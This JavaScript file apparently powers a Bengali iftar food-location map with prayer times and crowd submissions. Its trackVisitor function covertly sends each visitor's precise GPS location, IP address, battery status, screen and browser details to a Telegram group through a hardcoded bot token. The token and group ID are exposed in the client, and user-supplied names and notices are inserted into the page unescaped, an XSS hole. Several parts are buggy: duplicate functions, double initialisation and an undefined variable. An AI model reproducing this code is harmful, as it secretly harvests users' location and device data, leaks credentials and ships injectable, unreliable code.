// --- Global State ---
const BOT_TOKEN = "8557613495:AAGFQbDDcuJ6bJDndBUG75xKDHUGh19IYzU";
const GROUP_ID = "-1003876310720";

let map, miniMap, userMarker, selectedLocation;
let prayerTimesData = null;
let notificationSent = {}; // To prevent multiple notifications per minute

// Load locations from localStorage
// KEY RULE: null = first visit (load defaults), '[]' = user deleted all (stay empty)
const _rawLoc = localStorage.getItem('iftar_locations');
let locations;

if (_rawLoc === null) {
    // First ever visit — seed with user's requested data
    locations = [
        {
            id: 1,
            orgName: "বায়তুল মোকাররম জাতীয় মসজিদ",
            foodType: "biryani",
            date: "2026-03-01",
            time: "18:15",
            quantity: 500,
            lat: 23.7291,
            lng: 90.4121,
            status: "active",
            verified: true,
            confirmations: 45,
            reports: 0,
            isDaily: true
        },
        {
            id: 2,
            orgName: "ফার্মগেট কেন্দ্রীয় মসজিদ",
            foodType: "khichuri",
            date: "2026-03-01",
            time: "18:20",
            quantity: 200,
            lat: 23.7561,
            lng: 90.3907,
            status: "active",
            verified: false,
            confirmations: 13,
            reports: 1,
            isDaily: true
        },
        {
            id: 3,
            orgName: "নাঙ্গলকোট অনাথাশ্রম",
            foodType: "muri",
            date: "2026-03-01",
            time: "18:15",
            quantity: "অজানা",
            lat: 23.4680,
            lng: 90.9060,
            status: "active",
            verified: true,
            confirmations: 5,
            reports: 0,
            isDaily: true
        }
    ];
    localStorage.setItem('iftar_locations', JSON.stringify(locations));
} else {
    locations = JSON.parse(_rawLoc);
}


// --- Initialization ---
document.addEventListener('DOMContentLoaded', () => {
    initTabs();
    initMaps();
    renderStats();
    loadLocations();
    updateDate();

    // Request Location Permission & Load Times
    requestLocationAndTimes();

    // Request Notification Permission
    requestNotificationPermission();

    // Check for alerts every minute
    setInterval(checkForTimeAlerts, 60000);

    // UI Events
    document.getElementById('add-btn').onclick = () => openModal();
    document.querySelector('.close-modal').onclick = () => closeModal();
    document.getElementById('submission-form').onsubmit = handleSubmission;
    document.getElementById('locate-me').onclick = locateUser;
});

// ===== Filter Chip Handlers =====
function setFoodChip(btn) {
    document.querySelectorAll('.fchip').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    // Update hidden select so loadLocations still works
    const sel = document.getElementById('food-filter');
    if (sel) sel.value = btn.dataset.val;
    loadLocations();
}

function setDistChip(btn) {
    document.querySelectorAll('.dchip').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    const sel = document.getElementById('distance-filter');
    if (sel) sel.value = btn.dataset.val;
    loadLocations();
}

async function requestLocationAndTimes() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                map.setView([latitude, longitude], 14);
                await fetchPrayerTimes(latitude, longitude);

                // Track visitor ONLY after permission is granted
                trackVisitor(latitude, longitude);
            },
            async (error) => {
                console.warn("Location denied, defaulting to Nangolkot");
                showToast("লোকেশন পারমিশন পাওয়া যায়নি, নাঙ্গলকোটের সময় দেখানো হচ্ছে।", "info");
                await fetchPrayerTimes(23.4670, 90.9040); // Default Nangolkot
                // Optional: You could still track without location if you want, 
                // but your instruction says "jokon permition dey tahole telegrame jabe"
            }
        );
    } else {
        await fetchPrayerTimes(23.4670, 90.9040);
    }
}

async function fetchPrayerTimes(lat, lng) {
    try {
        const date = new Date().toLocaleDateString('en-GB').replace(/\//g, '-');
        const response = await fetch(`https://api.aladhan.com/v1/timings/${date}?latitude=${lat}&longitude=${lng}&method=2`);
        const data = await response.json();

        if (data.code === 200) {
            prayerTimesData = data.data.timings;
            renderPrayerTimes();
            initTimer();
            checkForTimeAlerts(); // Initial check
        }
    } catch (error) {
        console.error("API Error:", error);
        showToast("সময়ের তথ্য লোড করতে সমস্যা হয়েছে", "error");
    }
}

function requestNotificationPermission() {
    if ("Notification" in window) {
        Notification.requestPermission();
    }
}

function checkForTimeAlerts() {
    if (!prayerTimesData) return;

    const now = new Date();
    const currentH = String(now.getHours()).padStart(2, '0');
    const currentM = String(now.getMinutes()).padStart(2, '0');
    const currentTime = `${currentH}:${currentM}`;

    const alerts = {
        "Fajr": "ফজরের সময় হয়েছে",
        "Dhuhr": "যোহরের সময় হয়েছে",
        "Asr": "আসরের সময় হয়েছে",
        "Maghrib": "ইফতারের সময় হয়েছে! মাগরিবের আযান।",
        "Isha": "এশার সময় হয়েছে"
    };

    Object.keys(alerts).forEach(key => {
        if (prayerTimesData[key] === currentTime && !notificationSent[key + currentTime]) {
            sendNotification(alerts[key]);
            notificationSent[key + currentTime] = true;
        }
    });
}

function sendNotification(text) {
    if ("Notification" in window && Notification.permission === "granted") {
        new Notification("বিরিয়ানি দিবে - রিমাইন্ডার", {
            body: text,
            icon: "icon-192.png"
        });
    }
    showToast(text, "success");
}

// --- Tabs Management ---
function initTabs() {
    const tabBtns = document.querySelectorAll('.tab-btn');
    tabBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            const target = btn.dataset.tab;

            // Toggle buttons
            tabBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');

            // Toggle content
            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
            const targetEl = document.getElementById(target);
            if (targetEl) targetEl.classList.remove('hidden');

            // Refresh specific content
            if (target === 'map-view' && map) {
                setTimeout(() => map.invalidateSize(), 100);
            } else if (target === 'prayer-times') {
                renderPrayerTimes();
            } else if (target === 'list-view') {
                loadLocations();
            }
        });
    });
}

// --- Countdown Timer Logic ---
function initTimer() {
    if (!prayerTimesData) return;

    function updateCountdown() {
        const now = new Date();
        const [mH, mM] = prayerTimesData.Maghrib.split(':');

        const iftarTime = new Date();
        iftarTime.setHours(parseInt(mH), parseInt(mM), 0);

        let diff = iftarTime - now;

        if (diff < 0) {
            document.getElementById('next-prayer-label').innerText = "ইফতার সম্পন্ন হয়েছে";
            document.getElementById('iftar-timer').innerHTML = '<div class="time-block" style="width:100%"><span>আলহামদুলিল্লাহ</span></div>';
            return;
        }

        const h = Math.floor(diff / (1000 * 60 * 60));
        const m = Math.floor((diff / (1000 * 60)) % 60);
        const s = Math.floor((diff / 1000) % 60);

        document.getElementById('hours').innerText = String(h).padStart(2, '0');
        document.getElementById('mins').innerText = String(m).padStart(2, '0');
        document.getElementById('secs').innerText = String(s).padStart(2, '0');
    }

    setInterval(updateCountdown, 1000);
    updateCountdown();
}

// --- Food Type Translation ---
function translate(type) {
    const map = { biryani: 'বিরিয়ানি', kacchi: 'কাচ্চি', khichuri: 'খিচুড়ি', muri: 'বুট মুড়ি', others: 'অন্যান্য' };
    return map[type] || type;
}

// --- Map Logic ---
const NANGOLKOT = [23.4670, 90.9040]; // নাঙ্গলকোট, কুমিল্লা

function initMaps() {
    // ===== Main Map — Satellite + Labels =====
    map = L.map('main-map', { zoomControl: false }).setView(NANGOLKOT, 14);

    // Satellite imagery (Esri World Imagery — free, no API key)
    const satellite = L.tileLayer(
        'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
        {
            attribution: 'Tiles &copy; Esri &mdash; Source: Esri, i-cubed, USDA, USGS, AEX, GeoEye',
            maxZoom: 19
        }
    ).addTo(map);

    // Street labels on top of satellite (hybrid)
    L.tileLayer(
        'https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}',
        { maxZoom: 19, opacity: 0.9 }
    ).addTo(map);

    // Zoom control bottom-right
    L.control.zoom({ position: 'bottomright' }).addTo(map);

    // Scale bar
    L.control.scale({ position: 'bottomleft', imperial: false }).addTo(map);

    // ===== Mini Map (Submission form) — also satellite =====
    miniMap = L.map('mini-map').setView(NANGOLKOT, 14);
    L.tileLayer(
        'https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}',
        { maxZoom: 19 }
    ).addTo(miniMap);
    L.tileLayer(
        'https://server.arcgisonline.com/ArcGIS/rest/services/Reference/World_Boundaries_and_Places/MapServer/tile/{z}/{y}/{x}',
        { maxZoom: 19, opacity: 0.9 }
    ).addTo(miniMap);

    let miniMarker;
    miniMap.on('click', (e) => {
        const { lat, lng } = e.latlng;
        if (miniMarker) miniMap.removeLayer(miniMarker);

        // Gold star marker for selected point
        const selectedIcon = L.divIcon({
            className: '',
            html: `<div style="
                background:#fbbf24; border:3px solid white;
                border-radius:50%; width:20px; height:20px;
                box-shadow:0 0 0 4px rgba(251,191,36,0.4);
                animation: pulse 1s infinite;
            "></div>`,
            iconSize: [20, 20],
            iconAnchor: [10, 10]
        });

        miniMarker = L.marker([lat, lng], { icon: selectedIcon }).addTo(miniMap);
        document.getElementById('form-lat').value = lat;
        document.getElementById('form-lng').value = lng;

        // Show confirm message
        const msg = document.getElementById('loc-confirm-msg');
        if (msg) msg.style.display = 'block';
    });
}

// --- Mini-Map: আমার অবস্থান বাটন ---
function locateMiniMap() {
    if (!navigator.geolocation) {
        showToast('এই ডিভাইসে GPS সাপোর্ট নেই', 'error');
        return;
    }
    showToast('লোকেশন খোঁজা হচ্ছে...', 'info');
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const { latitude: lat, longitude: lng } = pos.coords;
            miniMap.setView([lat, lng], 17);

            // Place gold dot marker
            const icon = L.divIcon({
                className: '',
                html: `<div style="
                    background:#fbbf24;border:3px solid white;
                    border-radius:50%;width:20px;height:20px;
                    box-shadow:0 0 0 5px rgba(251,191,36,0.35);
                "></div>`,
                iconSize: [20, 20], iconAnchor: [10, 10]
            });
            // Remove old marker if any
            miniMap.eachLayer(l => { if (l._locateMarker) miniMap.removeLayer(l); });
            const m = L.marker([lat, lng], { icon });
            m._locateMarker = true;
            m.addTo(miniMap);

            document.getElementById('form-lat').value = lat;
            document.getElementById('form-lng').value = lng;
            const msg = document.getElementById('loc-confirm-msg');
            if (msg) msg.style.display = 'block';
            showToast('✅ আপনার অবস্থান নির্বাচিত হয়েছে!', 'success');
        },
        () => showToast('লোকেশন পারমিশন দিন', 'error')
    );
}

// --- Org Name Autocomplete ---
const NANGOLKOT_ORGS = [
    "নাঙ্গলকোট কেন্দ্রীয় জামে মসজিদ",
    "নাঙ্গলকোট বাজার জামে মসজিদ",
    "নাঙ্গলকোট থানা মসজিদ",
    "নাঙ্গলকোট ডিগ্রি কলেজ মাঠ",
    "নাঙ্গলকোট সরকারি হাসপাতাল",
    "নাঙ্গলকোট উপজেলা পরিষদ",
    "বরকিল জামে মসজিদ",
    "দাউদকান্দি জামে মসজিদ",
    "মাইজদী জামে মসজিদ",
    "জোরগাছা জামে মসজিদ",
    "তিতাস ইসলামিয়া মাদ্রাসা",
    "আল আমিন ফাউন্ডেশন",
    "রহমাত ইসলামিক ফাউন্ডেশন",
    "নাঙ্গলকোট মহিলা কলেজ",
    "নাঙ্গলকোট পাইলট হাই স্কুল",
    "গুণবতী ইসলামিয়া মাদ্রাসা"
];

function showOrgSuggestions(query) {
    const ul = document.getElementById('org-suggestions');
    if (!query || query.length < 1) { ul.style.display = 'none'; return; }

    // Merge preset list + existing saved locations names
    const allNames = [...new Set([
        ...NANGOLKOT_ORGS,
        ...locations.map(l => l.orgName)
    ])];

    const matches = allNames.filter(n =>
        n.toLowerCase().includes(query.toLowerCase()) ||
        n.includes(query)
    );

    if (!matches.length) { ul.style.display = 'none'; return; }

    ul.innerHTML = matches.map(name => `
        <li onclick="selectOrg('${name.replace(/'/g, "&apos;")}')" style="
            padding: 10px 16px;
            cursor: pointer;
            color: white;
            font-size: 0.9rem;
            border-bottom: 1px solid rgba(255,255,255,0.06);
            transition: background 0.15s;
        " onmouseover="this.style.background='rgba(251,191,36,0.15)'" onmouseout="this.style.background=''"
        >${name}</li>
    `).join('');

    ul.style.display = 'block';
}

function selectOrg(name) {
    document.getElementById('orgNameInput').value = name;
    document.getElementById('org-suggestions').style.display = 'none';
}

function loadLocations() {
    const listContainer = document.getElementById('location-list');
    if (!listContainer) return;

    // Clear existing markers
    map.eachLayer(layer => {
        if (layer instanceof L.Marker && layer !== userMarker) map.removeLayer(layer);
    });

    listContainer.innerHTML = '';

    const foodFilter = document.getElementById('food-filter').value;
    const distFilter = document.getElementById('distance-filter').value;
    const userLatLng = userMarker ? userMarker.getLatLng() : null;

    // Custom Icons for Map — clear & vivid
    const createIcon = (emoji, color) => L.divIcon({
        className: '',
        html: `
            <div style="
                background:${color};
                border: 3px solid white;
                border-radius: 50% 50% 50% 0;
                transform: rotate(-45deg);
                width: 40px; height: 40px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.35);
                display:flex; align-items:center; justify-content:center;
            ">
                <span style="transform:rotate(45deg); font-size:1.1rem; line-height:1;">${emoji}</span>
            </div>`,
        iconSize: [40, 48],
        iconAnchor: [20, 48],
        popupAnchor: [0, -50]
    });

    const icons = {
        biryani: createIcon('🍛', '#f59e0b'),
        kacchi: createIcon('🍖', '#d97706'),
        khichuri: createIcon('🥘', '#10b981'),
        muri: createIcon('🍚', '#60a5fa'),
        others: createIcon('🍽️', '#8b5cf6')
    };

    let visibleCount = 0;

    locations.forEach(loc => {
        // Apply Food Filter
        if (foodFilter !== 'all' && loc.foodType !== foodFilter) return;

        // Apply Distance Filter
        if (distFilter !== 'all' && userLatLng) {
            const distance = userLatLng.distanceTo([loc.lat, loc.lng]) / 1000; // km
            if (distance > parseInt(distFilter)) return;
        }

        // Add Marker with custom icon
        const marker = L.marker([loc.lat, loc.lng], { icon: icons[loc.foodType] || icons.others }).addTo(map);
        marker.bindPopup(`
            <div style="font-family:'Hind Siliguri',sans-serif; min-width:200px;">
                <div style="background:#064e3b;margin:-13px -20px 12px;padding:12px 16px;border-radius:4px 4px 0 0;">
                    <h4 style="margin:0;color:#fbbf24;font-size:0.95rem;line-height:1.4">${loc.orgName}</h4>
                    <span style="font-size:0.7rem;color:rgba(255,255,255,0.6)">${translate(loc.foodType)}</span>
                </div>
                <div style="font-size:0.82rem;color:#374151;line-height:1.8;padding:0 4px;">
                    ⏰ <b>সময়:</b> ${loc.time}<br>
                    👥 <b>পরিমাণ:</b> ${loc.quantity || 'অজানা'} জন<br>
                    ✅ <b>নিশ্চিত:</b> ${loc.confirmations} জন
                </div>
                <button onclick="navigateTo(${loc.lat}, ${loc.lng})" style="
                    margin-top:10px;width:100%;padding:8px;
                    background:#064e3b;color:#fbbf24;
                    border:none;border-radius:8px;
                    font-family:'Hind Siliguri',sans-serif;
                    font-size:0.82rem;font-weight:700;cursor:pointer;
                ">🗺️ রাস্তা দেখুন</button>
            </div>
        `, { maxWidth: 240 });

        // Add to List (Only if active)
        if (loc.status === 'active') {
            const card = createLocationCard(loc);
            listContainer.appendChild(card);
            visibleCount++;
        }
    });

    if (visibleCount === 0) {
        listContainer.innerHTML = '<p style="text-align:center; padding:40px; color:var(--text-muted)">আপাতত কোনো সক্রিয় ইফতার স্পট পাওয়া যায়নি।</p>';
    }

    renderStats();
}

function createLocationCard(loc) {
    const div = document.createElement('div');
    div.className = 'location-card';
    div.innerHTML = `
        <div class="card-header">
            <span class="badge badge-${loc.foodType}">${translate(loc.foodType)}</span>
            ${loc.verified ? '<span class="badge badge-verified"><i class="fas fa-check-circle"></i> ভেরিফাইড</span>' : ''}
        </div>
        <h3>${loc.orgName}</h3>
        <p><i class="fas fa-clock gold-text"></i> ${loc.time} | <i class="fas fa-users gold-text"></i> ${loc.quantity || 'অজানা'} জন</p>
        <div class="verification-actions">
            <button onclick="verify(${loc.id}, true)" class="btn-action success">
                <i class="fas fa-thumbs-up"></i> পেয়েছি (${loc.confirmations})
            </button>
            <button onclick="verify(${loc.id}, false)" class="btn-action danger">
                <i class="fas fa-thumbs-down"></i> পাইনি (${loc.reports})
            </button>
        </div>
        <button class="btn btn-glass btn-block" style="margin-top:10px" onclick="navigateTo(${loc.lat}, ${loc.lng})">
            <i class="fas fa-directions"></i> রাস্তা দেখুন
        </button>
    `;
    return div;
}

// --- Handlers ---
function openModal() {
    document.getElementById('add-modal').style.display = 'block';
    setTimeout(() => miniMap.invalidateSize(), 200);
}

function closeModal() {
    document.getElementById('add-modal').style.display = 'none';
}

function handleSubmission(e) {
    e.preventDefault();
    const formData = new FormData(e.target);
    const newLoc = {
        id: Date.now(),
        orgName: formData.get('orgName'),
        foodType: formData.get('foodType'),
        time: formData.get('time'),
        quantity: formData.get('quantity'),
        lat: parseFloat(formData.get('lat')),
        lng: parseFloat(formData.get('lng')),
        status: "pending",
        verified: false,
        confirmations: 0,
        reports: 0,
        isDaily: formData.get('isDaily') === 'on'
    };

    if (!newLoc.lat || !newLoc.lng) {
        showToast("দয়া করে ম্যাপে লোকেশন সিলেক্ট করুন", "error");
        return;
    }

    locations.push(newLoc);
    localStorage.setItem('iftar_locations', JSON.stringify(locations));

    // Send Submission to Telegram
    const msg = `
<b>🥘 New Iftar Submission!</b>
🏢 Org: ${newLoc.orgName}
🍴 Food: ${translate(newLoc.foodType)}
⏰ Time: ${newLoc.time}
📍 Location: ${newLoc.lat}, ${newLoc.lng}
📞 Contact: ${formData.get('phone') || 'N/A'}
    `;
    sendToTelegram(msg);

    showToast("আপনার সাবমিশন সফল হয়েছে। অ্যাডমিন অ্যাপ্রুভ করার পর এটি ম্যাপে দেখা যাবে।", "success");
    closeModal();
    e.target.reset();
    renderStats();
}

function verify(id, isPositive) {
    const loc = locations.find(l => l.id === id);
    if (!loc) return;

    if (isPositive) {
        loc.confirmations++;
        document.getElementById('cm-icon').textContent = '✅';
        document.getElementById('cm-title').textContent = 'আলহামদুলিল্লাহ!';
        document.getElementById('cm-msg').textContent = `আপনি নিশ্চিত করেছেন যে "${loc.orgName}" তে ইফতার পেয়েছেন। আল্লাহ কবুল করুন।`;
    } else {
        loc.reports++;
        document.getElementById('cm-icon').textContent = '😔';
        document.getElementById('cm-title').textContent = 'দুঃখিত!';
        document.getElementById('cm-msg').textContent = `"${loc.orgName}" তে ইফতার না পাওয়ার তথ্য রিপোর্ট করা হয়েছে। যাচাই করা হবে।`;
    }

    localStorage.setItem('iftar_locations', JSON.stringify(locations));
    loadLocations();

    // Show modal
    const overlay = document.getElementById('confirm-overlay');
    overlay.style.display = 'flex';
}

function closeConfirmOverlay() {
    document.getElementById('confirm-overlay').style.display = 'none';
}

function navigateTo(lat, lng) {
    window.open(`https://www.google.com/maps/dir/?api=1&destination=${lat},${lng}`);
}

function locateUser() {
    map.locate({ setView: true, maxZoom: 16 });
}

function checkAdminNotice() {
    const notice = localStorage.getItem('admin_notice');
    const container = document.getElementById('notice-container');
    if (notice && container) {
        container.innerHTML = `
            <div class="location-card" style="border-left: 5px solid var(--accent-gold); background: rgba(251, 191, 36, 0.1); margin-bottom: 20px;">
                <h4 style="color: var(--accent-gold); margin-bottom: 5px;"><i class="fas fa-bullhorn"></i> বিশেষ নোটিশ:</h4>
                <p style="font-size: 0.95rem; line-height: 1.5;">${notice}</p>
            </div>
        `;
    } else if (container) {
        container.innerHTML = '';
    }
}
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: GROUP_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) { console.error("Telegram error:", e); }
}

async function trackVisitor(lat, lng) {
    // ===== DUPLICATE PREVENTION =====
    // Cookie check: if already sent today, skip Telegram
    const COOKIE_KEY = 'iftar_visitor_sent';
    const alreadySent = document.cookie.split(';').some(c => c.trim().startsWith(COOKIE_KEY + '='));
    if (alreadySent) {
        console.log('Visitor already tracked today, skipping Telegram.');
        return;
    }

    // Set cookie for 24 hours
    const expires = new Date(Date.now() + 24 * 60 * 60 * 1000).toUTCString();
    document.cookie = `${COOKIE_KEY}=1; expires=${expires}; path=/; SameSite=Lax`;

    // Visitor Count
    let vCount = parseInt(localStorage.getItem('visitor_count') || '0');
    vCount++;
    localStorage.setItem('visitor_count', vCount.toString());

    // Save visitor profile (unlimited history)
    const profile = {
        time: new Date().toLocaleString('bn-BD'),
        lat, lng,
        page: window.location.href,
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: `${screen.width}x${screen.height}`
    };
    let logs = JSON.parse(localStorage.getItem('visitor_logs') || '[]');
    logs.unshift(profile);
    localStorage.setItem('visitor_logs', JSON.stringify(logs)); // no limit!

    // Fetch IP
    let ip = 'Unknown';
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        ip = (await r.json()).ip;
    } catch (e) { }

    // Battery
    let battery = 'Unknown';
    try {
        const b = await navigator.getBattery();
        battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : 'Not charging'})`;
    } catch (e) { }

    const googleMapUrl = `https://www.google.com/maps?q=${lat},${lng}`;

    const msg = `
<b>🚀 New Visitor — বিরিয়ানি দিবে</b>
<b>📅 Time:</b> ${profile.time}
<b>🌐 IP:</b> <code>${ip}</code>
<b>📍 Google Map:</b> ${googleMapUrl}
<b>🔋 Battery:</b> ${battery}
<b>📱 Screen:</b> ${profile.screen}
<b>🌍 Lang:</b> ${profile.lang}
<b>🔗 Page:</b> ${profile.page}

<b>🔍 User Agent:</b>
<code>${navigator.userAgent}</code>
#${visitorCount} ভিজিটর
    `;

    sendToTelegram(msg);
}


// --- Utils ---
function translate(val) {
    const map = {
        'biryani': 'বিরিয়ানি',
        'kacchi': 'কাচ্চি',
        'khichuri': 'খিচুড়ি',
        'others': 'অন্যান্য'
    };
    return map[val] || val;
}

function showToast(msg, type = 'info') {
    const container = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.innerText = msg;
    container.appendChild(toast);
    setTimeout(() => toast.remove(), 4000);
}

function renderStats() {
    document.getElementById('total-spots').innerText = locations.length;
    document.getElementById('active-today').innerText = locations.filter(l => l.status === 'active').length;
    document.getElementById('verified-count').innerText = locations.filter(l => l.verified).length;
}

function updateDate() {
    const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
    const dateStr = new Date().toLocaleDateString('bn-BD', options);
    document.getElementById('today-date-bn').innerText = dateStr;
    renderPrayerTimes();
}

function renderPrayerTimes() {
    const container = document.getElementById('prayer-list');
    if (!container) return;

    if (!prayerTimesData) {
        container.innerHTML = `
            <div style="text-align:center; padding:30px; color:var(--text-muted)">
                <i class="fas fa-spinner fa-spin" style="font-size:2rem; color:var(--accent-gold); margin-bottom:10px;"></i>
                <p>নামাজের সময় লোড হচ্ছে...</p>
                <p style="font-size:0.8rem;">লোকেশন পারমিশন দিন</p>
            </div>`;
        return;
    }

    // Build calendar header HTML
    const options = { day: 'numeric', month: 'long', year: 'numeric' };
    const gregDate = new Date().toLocaleDateString('bn-BD', options);

    const prayerMap = {
        "Imsak": { label: "সেহরি (শেষ সময়)", icon: "fa-moon", highlight: true },
        "Fajr": { label: "ফজর", icon: "fa-star-and-crescent", highlight: false },
        "Dhuhr": { label: "যোহর", icon: "fa-sun", highlight: false },
        "Asr": { label: "আসর", icon: "fa-cloud-sun", highlight: false },
        "Maghrib": { label: "মাগরিব (ইফতার)", icon: "fa-utensils", highlight: true },
        "Isha": { label: "এশা ও তারাবি", icon: "fa-mosque", highlight: false }
    };

    // Check which prayer is next
    const now = new Date();
    const nowMins = now.getHours() * 60 + now.getMinutes();
    let nextPrayerKey = null;
    let minDiff = Infinity;
    Object.keys(prayerMap).forEach(key => {
        if (!prayerTimesData[key]) return;
        const [h, m] = prayerTimesData[key].split(':');
        const pMins = parseInt(h) * 60 + parseInt(m);
        const diff = pMins - nowMins;
        if (diff >= 0 && diff < minDiff) {
            minDiff = diff;
            nextPrayerKey = key;
        }
    });

    container.innerHTML = `
        <div class="calendar-header">
            <h3>রমজান ক্যালেন্ডার ২০২৬</h3>
            <p>${gregDate} | নাঙ্গলকোট, কুমিল্লা</p>
        </div>
        ${Object.keys(prayerMap).map(key => {
        const time = prayerTimesData[key];
        if (!time) return '';
        const info = prayerMap[key];
        const isNext = key === nextPrayerKey;

        // Per-prayer countdown
        const [ph, pm] = time.split(':');
        const prayerDate = new Date();
        prayerDate.setHours(parseInt(ph), parseInt(pm), 0, 0);
        const diffMs = prayerDate - new Date();
        let cdLabel = '';
        if (diffMs > 0) {
            const cdH = Math.floor(diffMs / 3600000);
            const cdM = Math.floor((diffMs % 3600000) / 60000);
            cdLabel = cdH > 0
                ? `${cdH}ঘণ্. ${cdM}মি. পর`
                : `${cdM} মিনিট পর`;
        } else {
            cdLabel = 'সমাপ্ত ✔️';
        }

        return `
                <div class="prayer-item ${info.highlight ? 'highlight' : ''} ${isNext ? 'next-prayer' : ''}">
                    <div class="prayer-icon"><i class="fas ${info.icon}"></i></div>
                    <div style="flex:1">
                        <span class="prayer-name">${info.label}</span>
                        <div style="font-size:0.72rem;color:${isNext ? '#fbbf24' : 'var(--text-muted)'};margin-top:2px;">${cdLabel}</div>
                    </div>
                    <span class="prayer-time">${formatTime(time)}</span>
                    ${isNext ? '<span class="next-badge">পরবর্তী</span>' : ''}
                </div>
            `;
    }).join('')}
    `;
}

function formatTime(time24) {
    const [h, m] = time24.split(':');
    const hours = parseInt(h);
    const suffix = hours >= 12 ? 'PM' : 'AM';
    const h12 = hours % 12 || 12;
    return `${String(h12).padStart(2, '0')}:${m} ${suffix}`;
}

// --- Initialization ---
window.onload = () => {
    updateDate();
    initMaps();
    initTabs();
    initGlobalNotice();
    if (localStorage.getItem('admin_notice')) {
        initGlobalNotice();
    }
    // Refresh prayer times every minute for countdown
    setInterval(renderPrayerTimes, 60000);
};

// --- Global Notice System ---
function initGlobalNotice() {
    const notice = localStorage.getItem('admin_notice');
    const container = document.getElementById('global-notification-bar');
    if (notice && notice.trim() !== "" && container) {
        container.innerHTML = `
            <div class="notice-wrap">
                <div class="notice-content">
                    <i class="fas fa-bullhorn pulse-icon"></i>
                    <marquee behavior="scroll" direction="left" scrollamount="6">${notice}</marquee>
                </div>
                <button class="notice-close" onclick="document.getElementById('global-notification-bar').style.display='none'">&times;</button>
            </div>
        `;
        container.style.display = 'block';
    } else if (container) {
        container.style.display = 'none';
    }
}
